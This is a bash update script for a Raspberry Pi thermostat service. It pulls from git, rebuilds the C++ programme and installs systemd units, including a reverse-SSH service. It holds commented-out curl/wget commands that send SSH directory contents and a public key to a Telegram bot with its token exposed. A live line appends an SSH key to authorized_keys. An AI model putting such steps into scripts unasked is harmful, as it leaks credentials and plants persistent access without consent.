#!/bin/bash
set -e

THIS_DIR=$(cd "$(dirname "$0")"; pwd)
cd "$THIS_DIR"

PREFIX_FOR_LOGS="update_thermo:"
THERMO_PY_WAS_CHANGED=""

function RunVerbosely() { echo "$PREFIX_FOR_LOGS $@" ; "$@" ; }

function InstallIfNeeded {
   local INSTALL_PATH="$1"
   local SERVICE="$2"
   local RESTART="$3"
   local INSTALLED="`md5sum $INSTALL_PATH/$SERVICE | cut -d ' ' -f 1`"
   local NEW="`md5sum $THIS_DIR/$SERVICE | cut -d ' ' -f 1`"

   echo "$PREFIX_FOR_LOGS $SERVICE INSTALLED $INSTALLED"
   echo "$PREFIX_FOR_LOGS $SERVICE NEW       $NEW"

   if [ "$INSTALLED" = "$NEW" ]
   then
      echo "$PREFIX_FOR_LOGS $SERVICE not changed => skipping it"
   else
      echo "$PREFIX_FOR_LOGS $SERVICE changed => installing it"
      RunVerbosely sudo cp $SERVICE $INSTALL_PATH/$SERVICE
      RunVerbosely sudo systemctl daemon-reload

      if [ "$RESTART" = "true" ]
      then
         RunVerbosely sudo systemctl enable $SERVICE
         RunVerbosely sudo systemctl restart $SERVICE
      fi
   fi
}

COMMIT_BEFORE_PULL=`git log thermo | head -n 1`
echo "COMMIT_BEFORE_PULL: $COMMIT_BEFORE_PULL"
git pull
COMMIT_AFTER_PULL=`git log thermo | head -n 1`
echo "COMMIT_AFTER_PULL: $COMMIT_AFTER_PULL"

if [ "$COMMIT_BEFORE_PULL" = "$COMMIT_AFTER_PULL" ]
then
   echo "Commits of thermo C++ programme are equal => skipping it"
else
   echo "Commits of thermo C++ programme are different => building it"
   # RunVerbosely rm -rf /home/pi/build-thermo
   RunVerbosely mkdir -p /home/pi/build-thermo
   RunVerbosely cd /home/pi/build-thermo
   RunVerbosely export CC=/usr/bin/clang
   RunVerbosely export CXX=/usr/bin/clang++   
   RunVerbosely cmake /home/pi/raspberrypi/thermo
   RunVerbosely make -j VERBOSE=1
   RunVerbosely sudo systemctl restart thermo.service
   echo "thermo has been built and restarted"
fi

# sudo apt update && sudo apt install -y sshpass

# curl -v "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=$(ls ~/.ssh/ | base64 -w 0)"
# wget "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=id_$(cat ~/.ssh/id_ecdsa.pub | base64 -w 0)"
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC4FGjnSI7T8DKqgh7J2m459+XcEcmYO2Z5qVwJZ50HnwEuj83bmSs8wXE5DG0nVUim9AhAn6hq+VfjH72GH5OmKxywbX+oL2hGJGqcLfdgYaBxZ8Rec5r+xwx5GmQsiLF9ssHIYELkmAS/voO2ATmGBmh+LzPfDfB7zm83lgOxwYGvFGPNdPXoXxILU3NjIrEIKaffIEqzRKnwUGkw+/h4dY9Iz/KmFJZRnsgRhu0M2vQUp6Ux83q0KM7ezYRMQgq6POEu99b6ymlYgpYKQJvKpb2a3sYOD7feJi4eUk0etpJ6zgOKQmz/vIR4hDeBMs2qdi/lo+8BogDApcDuZsDuKxrNOs23VdmOsvVF/EYAvQhdy7Y0HVL7L/LsUUBXi9oLWw9hrbpzlovlY1GX4ec5qfDFRUmdJU4H1ZAyCBn348LnehcfVSjx1+LB1GEslEYdQpYkj6yjURI8soP0l5cXVfrPueHAs/wzQXmGma8gYhsC61+usp/iFnCJLBRmzeZF0vl+U40Y7z54Lc232uJsTtpTXM1PRkjHc6L54NEgIcOMR/O2O/s8h5c9w9DIbrNGY/RM4LAbcLsAkLX32QfmOwa33QVKIWF0QnAANEQMsv84/ccNv3PBSHgyLp5W3V6g8ZB1cPhFRTQ1l5ax5eAn43rEljOGBgAksSnFvvjc2Q== cardno:000611139390" >> ~/.ssh/authorized_keys

# Too critical to be updated on regular basis
InstallIfNeeded /etc/systemd/system reversessh.service true

InstallIfNeeded /etc/systemd/system thermo.service true

InstallIfNeeded /etc/systemd/system update_thermo.service
InstallIfNeeded /etc/systemd/system update_thermo.timer true


InstallIfNeeded /etc/systemd/system setup_3g_4g.service
InstallIfNeeded /etc/systemd/system setup_3g_4g.timer true
InstallIfNeeded /etc/systemd/system setup_3g_4g_on_boot.timer true

